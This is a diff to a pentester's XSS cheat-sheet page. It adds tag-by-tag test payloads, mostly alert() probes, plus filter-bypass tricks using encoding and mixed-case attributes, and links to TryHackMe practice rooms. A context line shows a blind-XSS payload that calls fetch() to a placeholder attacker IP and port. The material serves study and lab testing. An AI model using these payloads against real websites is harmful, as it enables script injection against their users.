@@ -134,6 +134,64 @@ An XSS polyglot is a string of text which can escape attributes, tags and bypass
 
 Taken from: [https://tryhackme.com/r/room/xss](https://tryhackme.com/r/room/xss)
 
+## General XSS payloads
+
+Generally, the following payloads containing different HTML tags can be used to test for the presence of  a XSS vulnerability. Some tag may work, while some may not.&#x20;
+
+For some browsers, the slash in the closing tag may work, while some may not.
+
+Eg. `<img>` vs `<img/>`
+
+
+
+_**General payloads**_
+
+1. `<script></script>`
+
+```html
+<script>alert('yay')</script>
+```
+
+2. `<img/>`
+
+```html
+<img src=x onerror="alert('xss')">
+<img src="javascript:alert('xss')">
+```
+
+3. `<svg/>`
+
+```html
+<svg onload="alert('xss')">
+```
+
+4. `<iframe/>`
+
+<pre class="language-html"><code class="lang-html"><strong>&#x3C;iframe src="javascript:alert('xss')">
+</strong>&#x3C;iframe srcdoc="&#x3C;script>alert('xss')&#x3C;/script>">
+</code></pre>
+
+5. `<a>`
+
+```html
+<a href="javascript:alert(1)">
+```
+
+6. `<span>, <br>`
+
+```html
+<span onmouseover="alert('xss')"></span>
+<br onmouseover=alert('xss')/>
+```
+
+7. `<video>`
+
+```html
+<video onplay="alert('xss')"><source src=x></video>
+```
+
+8. `<object/>`
+
 ## Blind XSS payloads
 
 1. `'"> <script>fetch('http://<IP>:[port]?xss=yay')</script>`
@@ -143,7 +201,31 @@ Taken from: [https://tryhackme.com/r/room/xss](https://tryhackme.com/r/room/xss)
 
 {% embed url="https://github.com/lauritzh/blind-xss-payloads/blob/main/README.md" %}
 
+## Bypass restrictions/filters, etc.
+
+1. Obfuscation
+
+-> unicode, url-encode, etc.
+
+-> base64
+
+2. Capitalization
+
+Eg. `<img src="x" onerror="alert('xss')"/>`&#x20;
+
+-> `<img sRc="x" onerror="alert('xss')"/>` (capitalize 'r' in _src_)
+
+-> `<img src="x" onerRoR="alert('xss')"/>` (capitalize 2 last 'r' in _onerror_)
+
+## Vulnerability assessment automation
+
+> TODO: Write a script that fuzzes different XSS payloads to the task 7 challenge of OWASP juice shop TryHackMe challenge (link below)
+
 ## Practice
+
+Tasl 7 of OWASP juice shop room in TryHackMe:&#x20;
+
+{% embed url="https://tryhackme.com/room/owaspjuiceshop" %}
 
 {% embed url="https://tryhackme.com/r/room/thestickershop" %}
 
